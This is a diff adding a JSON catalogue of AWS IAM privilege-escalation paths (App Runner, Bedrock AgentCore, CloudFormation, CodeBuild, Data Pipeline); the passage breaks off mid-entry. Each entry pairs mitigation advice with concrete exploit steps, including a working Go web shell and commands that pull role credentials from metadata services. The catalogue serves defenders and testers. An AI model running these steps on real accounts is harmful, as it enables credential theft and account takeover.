@@ -1,0 +1,2857 @@
+[
+  {
+    "id": "apprunner-001",
+    "name": "iam:PassRole + apprunner:CreateService",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "apprunner"
+    ],
+    "description": "A principal with `iam:PassRole` and `apprunner:CreateService` can create an AWS App Runner service with a privileged IAM role. By deploying a malicious container image (such as a web shell or reverse shell) as the App Runner service, the attacker can execute arbitrary code within the container. The container has access to the IAM role's credentials via the AWS SDK or instance metadata service, allowing the attacker to perform actions with the role's elevated permissions. This technique provides direct privilege escalation to any IAM role that can be attached to App Runner services.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts apprunner.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
+        "Access to a container registry (ECR or public registry) to host the malicious image"
+      ],
+      "lateral": [
+        "A role must exist that trusts apprunner.amazonaws.com to assume it",
+        "Access to a container registry (ECR or public registry) to host the malicious image"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "cat > main.go << 'EOF'\npackage main\nimport (\n    \"net/http\"\n    \"os/exec\"\n)\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    cmd := r.URL.Query().Get(\"cmd\")\n    out, _ := exec.Command(\"sh\", \"-c\", cmd).CombinedOutput()\n    w.Write(out)\n}\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}\nEOF\n",
+          "description": "Create a simple web shell that executes commands via URL parameters"
+        },
+        {
+          "step": 2,
+          "command": "cat > Dockerfile << 'EOF'\nFROM golang:1.19\nWORKDIR /app\nCOPY main.go .\nRUN go build -o webshell main.go\nEXPOSE 8080\nCMD [\"./webshell\"]\nEOF\n",
+          "description": "Create a Dockerfile for the web shell"
+        },
+        {
+          "step": 3,
+          "command": "docker build -t malicious-apprunner .\ndocker tag malicious-apprunner:latest PUBLIC_ECR_URI:latest\ndocker push PUBLIC_ECR_URI:latest\n",
+          "description": "Build and push the malicious container image to a registry"
+        },
+        {
+          "step": 4,
+          "command": "aws apprunner create-service \\\n  --service-name privesc-service \\\n  --source-configuration '{\n    \"ImageRepository\": {\n      \"ImageIdentifier\": \"PUBLIC_ECR_URI:latest\",\n      \"ImageRepositoryType\": \"ECR_PUBLIC\",\n      \"ImageConfiguration\": {\n        \"Port\": \"8080\"\n      }\n    },\n    \"AutoDeploymentsEnabled\": false\n  }' \\\n  --instance-configuration '{\n    \"InstanceRoleArn\": \"arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\"\n  }'\n",
+          "description": "Create an App Runner service with the malicious image and privileged role"
+        },
+        {
+          "step": 5,
+          "command": "aws apprunner describe-service --service-arn SERVICE_ARN",
+          "description": "Wait for the service to be in 'RUNNING' status and retrieve the service URL"
+        },
+        {
+          "step": 6,
+          "command": "curl \"https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"\n",
+          "description": "Use the web shell to retrieve temporary credentials from the container metadata"
+        },
+        {
+          "step": 7,
+          "command": "export AWS_ACCESS_KEY_ID=<from step 6>\nexport AWS_SECRET_ACCESS_KEY=<from step 6>\nexport AWS_SESSION_TOKEN=<from step 6>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to assume the privileged role's permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificAppRunnerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"apprunner.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `apprunner:CreateService` permissions to specific users/roles\n- Monitor CloudTrail for App Runner service creation with privileged roles\n- Use VPC configuration to isolate App Runner services\n- Implement container image scanning and signing\n- Only allow images from trusted ECR repositories\n- Alert on App Runner services created with administrative roles\n- Use AWS Config to detect services with overly permissive roles\n",
+    "discoveredBy": {
+      "name": "Riyaz Walikar",
+      "organization": "Appsecco",
+      "date": "2021"
+    },
+    "references": [
+      {
+        "title": "Getting Shell and Data Access in AWS App Runner",
+        "url": "https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77"
+      },
+      {
+        "title": "HackTricks Cloud - AWS App Runner Privilege Escalation",
+        "url": "https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-privilege-escalation/aws-apprunner-privesc"
+      }
+    ],
+    "relatedPaths": [
+      "apprunner-002",
+      "lambda-001",
+      "ec2-001"
+    ],
+    "toolSupport": {
+      "pmapper": false,
+      "iamVulnerable": false
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "apprunner:CreateService",
+          "resourceConstraints": "Must have permission to create App Runner services"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "apprunner-002",
+    "name": "apprunner:UpdateService",
+    "category": "access-resource",
+    "services": [
+      "apprunner"
+    ],
+    "description": "A principal with `apprunner:UpdateService` can modify an existing App Runner service's container image. If the target service has a privileged IAM role attached, the attacker can update the service to use a malicious container image (such as a web shell) and execute arbitrary code with the service's role permissions. This is similar to `lambda:UpdateFunctionCode` but for containerized applications. Unlike creating a new service, this doesn't require `iam:PassRole` since the role is already attached to the existing service.",
+    "prerequisites": {
+      "admin": [
+        "An App Runner service must exist with an IAM role attached",
+        "The service's role must have administrative permissions",
+        "Access to a container registry (ECR or public registry) to host the malicious image"
+      ],
+      "lateral": [
+        "An App Runner service must exist with an IAM role attached",
+        "Access to a container registry (ECR or public registry) to host the malicious image"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws apprunner list-services",
+          "description": "List existing App Runner services to find targets with privileged roles"
+        },
+        {
+          "step": 2,
+          "command": "aws apprunner describe-service --service-arn SERVICE_ARN",
+          "description": "Check the service's instance role ARN to confirm elevated permissions"
+        },
+        {
+          "step": 3,
+          "command": "cat > main.go << 'EOF'\npackage main\nimport (\n    \"net/http\"\n    \"os/exec\"\n)\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    cmd := r.URL.Query().Get(\"cmd\")\n    out, _ := exec.Command(\"sh\", \"-c\", cmd).CombinedOutput()\n    w.Write(out)\n}\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}\nEOF\n",
+          "description": "Create a web shell that executes commands via URL parameters"
+        },
+        {
+          "step": 4,
+          "command": "docker build -t malicious-apprunner .\ndocker tag malicious-apprunner:latest PUBLIC_ECR_URI:latest\ndocker push PUBLIC_ECR_URI:latest\n",
+          "description": "Build and push the malicious container image to a registry"
+        },
+        {
+          "step": 5,
+          "command": "aws apprunner update-service \\\n  --service-arn SERVICE_ARN \\\n  --source-configuration '{\n    \"ImageRepository\": {\n      \"ImageIdentifier\": \"PUBLIC_ECR_URI:latest\",\n      \"ImageRepositoryType\": \"ECR_PUBLIC\",\n      \"ImageConfiguration\": {\n        \"Port\": \"8080\"\n      }\n    }\n  }'\n",
+          "description": "Update the existing service with the malicious container image"
+        },
+        {
+          "step": 6,
+          "command": "aws apprunner describe-service --service-arn SERVICE_ARN",
+          "description": "Wait for the service to complete deployment and retrieve the service URL"
+        },
+        {
+          "step": 7,
+          "command": "curl \"https://SERVICE_URL/?cmd=curl%20169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"\n",
+          "description": "Use the web shell to retrieve temporary credentials from the container metadata"
+        },
+        {
+          "step": 8,
+          "command": "export AWS_ACCESS_KEY_ID=<from step 7>\nexport AWS_SECRET_ACCESS_KEY=<from step 7>\nexport AWS_SESSION_TOKEN=<from step 7>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to assume the privileged role's permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `apprunner:UpdateService` permission using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"apprunner:UpdateService\",\n  \"Resource\": \"arn:aws:apprunner:REGION:ACCOUNT_ID:service/SpecificService/HASH\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `UpdateService` events on sensitive App Runner services\n- Implement container image scanning and require signed images\n- Only allow images from approved ECR repositories using conditions\n- Alert on source configuration changes to services with privileged roles\n- Use AWS Config to detect unauthorized service updates\n- Implement deployment approvals for production services\n- Enable auto-deployments only from trusted source repositories\n",
+    "discoveredBy": {
+      "name": "Riyaz Walikar",
+      "organization": "Appsecco",
+      "date": "2021"
+    },
+    "references": [
+      {
+        "title": "Getting Shell and Data Access in AWS App Runner",
+        "url": "https://blog.appsecco.com/getting-shell-and-data-access-in-aws-app-runner-3632e844bc77"
+      },
+      {
+        "title": "HackTricks Cloud - AWS App Runner Privilege Escalation",
+        "url": "https://cloud.hacktricks.wiki/pentesting-cloud/aws-security/aws-privilege-escalation/aws-apprunner-privesc"
+      }
+    ],
+    "relatedPaths": [
+      "apprunner-001",
+      "lambda-003",
+      "glue-002"
+    ],
+    "toolSupport": {
+      "pmapper": false,
+      "iamVulnerable": false
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "apprunner:UpdateService",
+          "resourceConstraints": "Target App Runner service must be in the Resource section"
+        }
+      ]
+    }
+  },
+  {
+    "id": "bedrock-001",
+    "name": "iam:PassRole + bedrock-agentcore:CreateCodeInterpreter + bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "bedrock-agentcore"
+    ],
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "bedrock-agentcore:CreateCodeInterpreter",
+          "resourceConstraints": "Must have permission to create Bedrock AgentCore code interpreters"
+        },
+        {
+          "permission": "bedrock-agentcore:StartCodeInterpreterSession",
+          "resourceConstraints": "Must have permission to start sessions with code interpreters"
+        },
+        {
+          "permission": "bedrock-agentcore:InvokeCodeInterpreter",
+          "resourceConstraints": "Must have permission to invoke code interpreters"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        },
+        {
+          "permission": "bedrock-agentcore:GetCodeInterpreter",
+          "resourceConstraints": "Can be help"
+        }
+      ]
+    },
+    "description": "A principal with `iam:PassRole`, `bedrock-agentcore:CreateCodeInterpreter`, `bedrock-agentcore:StartCodeInterpreterSession`, and `bedrock-agentcore:InvokeCodeInterpreter` can create and invoke an AWS Bedrock AgentCore code interpreter with a privileged IAM execution role. Code interpreters run on Firecracker MicroVMs and can access the MicroVM Metadata Service (MMDS) at 169.254.169.254, similar to EC2's IMDS. By creating a code interpreter with a privileged role and invoking arbitrary Python code within it, an attacker can retrieve temporary credentials from the metadata service and gain the full permissions of the execution role. This is a novel privilege escalation path specific to AWS's AI/ML tooling.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
+      ],
+      "lateral": [
+        "A role must exist that trusts bedrock-agentcore.amazonaws.com to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "export AWS_REGION=[your region]\nexport EXECUTION_ROLE=[arn with admin privs]\nexport AWS_ACCESS_KEY_ID = [access key]\nexport AWS_SECRET_ACCESS_KEY = [secret access key]\nexport AWS_SESSION_TOKEN = [session token if applicable]\nwhich jq\n",
+          "description": "Set up current session variables and confirm jq is installed"
+        },
+        {
+          "step": 2,
+          "command": "INTERPRETER_ID=$(aws bedrock-agentcore-control create-code-interpreter \\\n  --name privesc \\\n  --network-configuration '{\"networkMode\":\"SANDBOX\"}' \\\n  --execution-role-arn $EXECUTION_ROLE | jq -r .codeInterpreterId)\n",
+          "description": "Create a code interpreter with the privileged execution role"
+        },
+        {
+          "step": 3,
+          "command": "cat << 'EOF' > \"get_secrets_from_interpreter.py\"\nimport boto3\nimport sys\nbedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])\nCODE_INTERPRETER_ID = sys.argv[1]\n\nsession = bedrock_agentcore_client.start_code_interpreter_session(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n)\nsession_id = session['sessionId']\n\ncode = 'IP=\"169.254.169.254\"; METADATA=\"meta-data\"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'\n\nresponse = bedrock_agentcore_client.invoke_code_interpreter(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n  sessionId=session_id,\n  name='executeCommand',\n  arguments={'command': code}\n)\n\nfor event in response['stream']:\n  if event['result']['structuredContent']['stdout']:\n    print(event['result']['structuredContent']['stdout'])\nEOF\n",
+          "description": "Create the python file that will invoke the interpreter"
+        },
+        {
+          "step": 4,
+          "command": "CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)\necho export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r \".AccessKeyId\")\necho export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r \".SecretAccessKey\")\necho export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r \".Token\")\n",
+          "description": "Run the python file using the $INTERPRETER_ID to extract credentials"
+        },
+        {
+          "step": 5,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to assume the privileged role's permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege and implement\nService Control Policies (SCPs) to prevent unauthorized code interpreter creation.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificBedrockRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"bedrock-agentcore.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Use SCPs to deny `bedrock-agentcore:CreateCodeInterpreter` org-wide if not needed\n- Restrict `bedrock-agentcore:InvokeCodeInterpreter` to specific code interpreters\n- Follow principle of least privilege for code interpreter execution roles\n- Ensure execution roles have equal or fewer privileges than invoking users\n- Enable CloudTrail Data Event logging for code interpreter invocations\n- Monitor for `CreateCodeInterpreter` and `InvokeCodeInterpreter` events\n- Alert on code interpreters created with administrative roles\n- Implement resource tags and condition keys to restrict code interpreter usage\n- Regularly audit execution roles attached to code interpreters\n",
+    "discoveredBy": {
+      "name": "Nigel Sood",
+      "organization": "Sonrai Security",
+      "date": "2025"
+    },
+    "references": [
+      {
+        "title": "AWS AgentCore: The Overlooked Privilege Escalation Path in Bedrock AI Tooling",
+        "url": "https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/"
+      },
+      {
+        "title": "Sandboxed to Compromised: New Research Exposes Credential Exfiltration Paths in AWS Code Interpreters",
+        "url": "https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/"
+      },
+      {
+        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
+      }
+    ],
+    "relatedPaths": [
+      "bedrock-002",
+      "lambda-001",
+      "ec2-001",
+      "sagemaker-001"
+    ],
+    "toolSupport": {
+      "pmapper": false,
+      "iamVulnerable": false
+    }
+  },
+  {
+    "id": "bedrock-002",
+    "name": "bedrock-agentcore:StartCodeInterpreterSession + bedrock-agentcore:InvokeCodeInterpreter",
+    "category": "access-resource",
+    "services": [
+      "bedrock-agentcore"
+    ],
+    "description": "A principal with `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter` can access an existing Bedrock AgentCore code interpreter that has a privileged IAM execution role attached. By starting a session and invoking arbitrary Python code within the interpreter, an attacker can access the MicroVM Metadata Service (MMDS) at 169.254.169.254 to retrieve temporary credentials for the interpreter's execution role. This path doesn't require `iam:PassRole` since the role is already attached to the existing interpreter. Similar to `lambda:UpdateFunctionCode`, this targets existing resources rather than creating new ones.",
+    "prerequisites": {
+      "admin": [
+        "A Bedrock AgentCore code interpreter must exist with an IAM execution role attached",
+        "The interpreter's role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)",
+        "The interpreter must be in a running or ready state"
+      ],
+      "lateral": [
+        "A Bedrock AgentCore code interpreter must exist with an IAM execution role attached",
+        "The interpreter must be in a running or ready state"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws bedrock-agentcore-control list-code-interpreters",
+          "description": "List existing code interpreters to find targets with privileged roles"
+        },
+        {
+          "step": 2,
+          "command": "aws bedrock-agentcore-control get-code-interpreter --code-interpreter-id INTERPRETER_ID",
+          "description": "Check the interpreter's execution role ARN to confirm elevated permissions"
+        },
+        {
+          "step": 3,
+          "command": "cat << 'EOF' > \"get_secrets_from_interpreter.py\"\nimport boto3\nimport sys\nbedrock_agentcore_client = boto3.client('bedrock-agentcore', region_name=sys.argv[2])\nCODE_INTERPRETER_ID = sys.argv[1]\n\nsession = bedrock_agentcore_client.start_code_interpreter_session(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n)\nsession_id = session['sessionId']\n\ncode = 'IP=\"169.254.169.254\"; METADATA=\"meta-data\"; curl -s http://$IP/latest/$METADATA/iam/security-credentials/execution_role'\n\nresponse = bedrock_agentcore_client.invoke_code_interpreter(\n  codeInterpreterIdentifier=CODE_INTERPRETER_ID,\n  sessionId=session_id,\n  name='executeCommand',\n  arguments={'command': code}\n)\n\nfor event in response['stream']:\n  if event['result']['structuredContent']['stdout']:\n    print(event['result']['structuredContent']['stdout'])\nEOF\n",
+          "description": "Create the python file that will invoke the existing interpreter"
+        },
+        {
+          "step": 4,
+          "command": "CREDS=$(python3 get_secrets_from_interpreter.py $INTERPRETER_ID $AWS_REGION)\necho export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r \".AccessKeyId\")\necho export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r \".SecretAccessKey\")\necho export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r \".Token\")\n",
+          "description": "Run the python file using the $INTERPRETER_ID to extract credentials"
+        },
+        {
+          "step": 5,
+          "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId from step 5>\nexport AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 5>\nexport AWS_SESSION_TOKEN=<Token from step 5>\naws sts get-caller-identity\n",
+          "description": "Use the stolen credentials to assume the privileged role's permissions"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `bedrock-agentcore:StartCodeInterpreterSession` and `bedrock-agentcore:InvokeCodeInterpreter`\npermissions using resource-based constraints.\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\n    \"bedrock-agentcore:StartCodeInterpreterSession\",\n    \"bedrock-agentcore:InvokeCodeInterpreter\"\n  ],\n  \"Resource\": \"arn:aws:bedrock-agentcore:REGION:ACCOUNT_ID:code-interpreter/SpecificInterpreter\"\n}\n```\n\nAdditional controls:\n- Monitor CloudTrail for `StartCodeInterpreterSession` and `InvokeCodeInterpreter` events on sensitive code interpreters\n- Alert on session creation for interpreters with administrative roles\n- Implement resource tags and condition keys to restrict code interpreter usage\n- Regularly audit execution roles attached to code interpreters\n- Use SCPs to restrict access to sensitive interpreters\n- Enable CloudTrail Data Event logging for code interpreter invocations\n- Implement network isolation for code interpreters processing sensitive data\n- Review and minimize execution role permissions on existing interpreters\n",
+    "discoveredBy": {
+      "name": "Nigel Sood",
+      "organization": "Sonrai Security",
+      "date": "2025"
+    },
+    "references": [
+      {
+        "title": "AWS AgentCore: The Overlooked Privilege Escalation Path in Bedrock AI Tooling",
+        "url": "https://sonraisecurity.com/blog/aws-agentcore-privilege-escalation-bedrock-scp-fix/"
+      },
+      {
+        "title": "Sandboxed to Compromised: New Research Exposes Credential Exfiltration Paths in AWS Code Interpreters",
+        "url": "https://sonraisecurity.com/blog/sandboxed-to-compromised-new-research-exposes-credential-exfiltration-paths-in-aws-code-interpreters/"
+      },
+      {
+        "title": "Understanding Credentials Management in Amazon Bedrock AgentCore",
+        "url": "https://docs.aws.amazon.com/bedrock-agentcore/latest/devguide/security-credentials-management.html"
+      }
+    ],
+    "relatedPaths": [
+      "bedrock-001",
+      "lambda-003",
+      "glue-002",
+      "ec2-002"
+    ],
+    "toolSupport": {
+      "pmapper": false,
+      "iamVulnerable": false
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "bedrock-agentcore:StartCodeInterpreterSession",
+          "resourceConstraints": "Target code interpreter must be in the Resource section"
+        },
+        {
+          "permission": "bedrock-agentcore:InvokeCodeInterpreter",
+          "resourceConstraints": "Target code interpreter must be in the Resource section"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "bedrock-agentcore:ListCodeInterpreters",
+          "resourceConstraints": "List the interpreters that already exist"
+        },
+        {
+          "permission": "bedrock-agentcore:GetCodeInterpreter",
+          "resourceConstraints": "Identify the role associated with the session"
+        }
+      ]
+    }
+  },
+  {
+    "id": "cloudformation-001",
+    "name": "iam:PassRole + cloudformation:CreateStack",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "cloudformation"
+    ],
+    "description": "A principal with `iam:PassRole` and `cloudformation:CreateStack` can launch a CloudFormation template that creates AWS resources. The template executes with the permissions of the passed IAM role. This allows creation of resources controlled by the attacker, such as IAM users, Lambda functions, or EC2 instances. The level of access gained depends on the permissions of the available roles.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts cloudformation.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "A role must exist that trusts cloudformation.amazonaws.com to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws cloudformation create-stack --stack-name privesc-stack --template-body file://exploit-template.yaml --capabilities CAPABILITY_IAM --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+          "description": "Create a CloudFormation stack with a template that creates privileged resources"
+        },
+        {
+          "step": 2,
+          "command": "aws cloudformation describe-stacks --stack-name privesc-stack",
+          "description": "Monitor stack creation progress"
+        },
+        {
+          "step": 3,
+          "command": "# Access the newly created resources (e.g., IAM user, Lambda function)",
+          "description": "Use the elevated privileges of the created resources"
+        }
+      ],
+      "pacu": [
+        {
+          "step": 1,
+          "command": "run cloudformation__create_stack --stack-name privesc-stack --template exploit-template.yaml --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE",
+          "description": "Use Pacu to create CloudFormation stack with privileged role"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"`iam:PassRole`\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificCFNRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"`iam:PassedToService`\": \"cloudformation.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `cloudformation:CreateStack` to specific stack name patterns or templates\n- Use CloudFormation service roles with minimal required permissions\n- Enable CloudFormation stack policies to prevent unauthorized modifications\n- Monitor CloudTrail for CloudFormation stack creation and the resources they provision\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "AWS Privilege Escalation Methods and Mitigation",
+        "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+      },
+      {
+        "title": "IAM Vulnerable - PassExistingRoleToCloudFormation",
+        "url": "https://github.com/BishopFox/iam-vulnerable/blob/main/modules/free-resources/privesc-paths/privesc20-PassExistingRoleToCloudFormation.tf"
+      }
+    ],
+    "relatedPaths": [
+      "ec2-001",
+      "lambda-001"
+    ],
+    "toolSupport": {
+      "pmapper": true,
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "cloudformation:CreateStack",
+          "resourceConstraints": "Must have permission to create CloudFormation stacks"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "codebuild-001",
+    "name": "iam:PassRole + codebuild:CreateProject",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "codebuild"
+    ],
+    "description": "A principal with `iam:PassRole` and `codebuild:CreateProject` can create a new CodeBuild project and attach an existing IAM role to it. The build project can execute arbitrary code (via buildspec.yml) with the permissions of the attached role, allowing the attacker to escalate privileges. The level of access gained depends on the permissions of the available roles.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts codebuild.amazonaws.com to assume it",
+        "The role must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "A role must exist that trusts codebuild.amazonaws.com to assume it"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws codebuild create-project --name privesc-project \\\n  --source type=NO_SOURCE,buildspec=\"version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - aws sts get-caller-identity\\n      - aws iam list-users\" \\\n  --artifacts type=NO_ARTIFACTS \\\n  --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:5.0,computeType=BUILD_GENERAL1_SMALL \\\n  --service-role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE\n",
+          "description": "Create a CodeBuild project with the privileged role and malicious buildspec"
+        },
+        {
+          "step": 2,
+          "command": "aws codebuild start-build --project-name privesc-project",
+          "description": "Start the build to execute code with elevated privileges"
+        },
+        {
+          "step": 3,
+          "command": "aws codebuild batch-get-builds --ids $(aws codebuild list-builds-for-project --project-name privesc-project --query 'ids[0]' --output text)",
+          "description": "Retrieve build logs containing the output of privileged commands"
+        }
+      ]
+    },
+    "recommendation": "Restrict the `iam:PassRole` permission using the principle of least privilege.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificCodeBuildRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"codebuild.amazonaws.com\"\n    }\n  }\n}\n```\n\nAdditional controls:\n- Restrict `codebuild:CreateProject` to specific project name patterns\n- Require approval for buildspec content in source repositories\n- Monitor CloudTrail for CodeBuild project creation with privileged roles\n- Enable CodeBuild VPC configuration to restrict network access\n",
+    "discoveredBy": {
+      "name": "Spencer Gietzen",
+      "organization": "Rhino Security Labs",
+      "date": "2019"
+    },
+    "references": [
+      {
+        "title": "IAM Vulnerable - CodeBuild PassRole",
+        "url": "https://github.com/BishopFox/iam-vulnerable"
+      }
+    ],
+    "relatedPaths": [
+      "ec2-001",
+      "lambda-001",
+      "cloudformation-001"
+    ],
+    "toolSupport": {
+      "iamVulnerable": true
+    },
+    "permissions": {
+      "required": [
+        {
+          "permission": "iam:PassRole",
+          "resourceConstraints": "Target role ARN must be in the Resource section"
+        },
+        {
+          "permission": "codebuild:CreateProject",
+          "resourceConstraints": "Must have permission to create CodeBuild projects"
+        }
+      ],
+      "additional": [
+        {
+          "permission": "iam:ListRoles",
+          "resourceConstraints": "Helpful for discovering available roles to pass"
+        },
+        {
+          "permission": "iam:GetRole",
+          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
+        }
+      ]
+    }
+  },
+  {
+    "id": "datapipeline-001",
+    "name": "iam:PassRole + datapipeline:CreatePipeline",
+    "category": "service-passrole",
+    "services": [
+      "iam",
+      "datapipeline"
+    ],
+    "description": "A principal with `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, and `datapipeline:ActivatePipeline` can create a new Data Pipeline that executes arbitrary code with the permissions of a passed IAM role. Data Pipeline can run shell commands on EC2 instances or EMR clusters, allowing privilege escalation. The level of access gained depends on the permissions of the available roles.",
+    "prerequisites": {
+      "admin": [
+        "A role must exist that trusts datapipeline.amazonaws.com or elasticmapreduce.amazonaws.com",
+        "The role must have administrative permissions (e.g., AdministratorAccess)"
+      ],
+      "lateral": [
+        "A role must exist that trusts datapipeline.amazonaws.com or elasticmapreduce.amazonaws.com"
+      ]
+    },
+    "exploitationSteps": {
+      "awscli": [
+        {
+          "step": 1,
+          "command": "aws datapipeline create-pipeline --name privesc-pipeline --unique-id privesc-$(date +%s)\n",
+          "description": "Create a new Data Pipeline"
+        },
+        {
+          "step": 2,
